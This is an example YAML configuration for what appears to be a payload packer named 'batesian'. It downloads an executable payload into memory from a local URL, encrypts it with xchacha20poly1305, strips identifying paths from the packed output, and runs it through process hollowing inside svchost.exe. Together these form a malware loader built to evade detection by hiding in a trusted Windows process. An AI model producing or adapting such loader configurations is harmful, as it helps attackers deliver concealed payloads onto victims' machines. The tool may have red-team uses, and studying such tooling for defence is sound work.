# Example: fetch the input payload from a URL, in memory (no disk write).
# Usage: batesian build examples/configs/test-url.yaml
schema: 4
name: test-url

build:
  payload:
    source: http://127.0.0.1:8000/test_payload.exe
    crypto:
      algo: xchacha20poly1305
      key: random
  output:
    path: ./dist/test_url_packed.exe
    arch: x64
    strip: true
    trim_paths: all

runtime:
  - technique: process_hollowing
    params:
      target: "C:\\Windows\\System32\\svchost.exe"
